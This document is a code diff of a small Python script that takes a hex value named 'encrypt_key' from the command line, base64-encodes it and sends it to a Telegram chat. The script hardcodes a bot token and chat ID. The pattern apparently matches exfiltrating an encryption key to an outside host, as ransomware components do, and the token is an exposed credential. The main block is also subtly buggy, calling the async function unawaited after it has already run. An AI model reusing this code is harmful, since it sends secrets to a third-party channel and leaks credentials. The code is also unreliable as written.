@@ -1,10 +1,23 @@
-import asyncio
 import telegram as tel
+import asyncio
+import base64
 import sys
 
-async def send_message():
-    bot = tel.Bot(token="6345282020:AAE4Z_7L9islIhFbBfkMcY3Sa5m2ZkrvxJE")
-    chat_id = 6478368513
-    await bot.send_message(chat_id=chat_id, text=sys.argv[1])
+# fuction: encoding base64
+def encode_to_base64(byte_data):  # argument type: Byte type
+    return base64.b64encode(byte_data).decode('utf-8')
 
-asyncio.run(send_message())  # Python 3.7 이상을 사용하고 있다면 asyncio.run으로 비동기 함수를 실행합니다.
+# fuction: send data to myChatBot
+async def send_message():
+    bot = tel.Bot(token="6345282020:AAE4Z_7L9islIhFbBfkMcY3Sa5m2ZkrvxJE")  # botToken value
+    chatBot_ID = 6478368513  # chatBot ID value
+
+    encrypt_key = bytes.fromhex(sys.argv[1])  # argument type conversion: hex string to Byte type
+
+    await bot.send_message(chat_id=chatBot_ID, text=encode_to_base64(encrypt_key))  # send data
+
+asyncio.run(send_message())
+
+# main
+if __name__ == '__main__':
+    send_message()
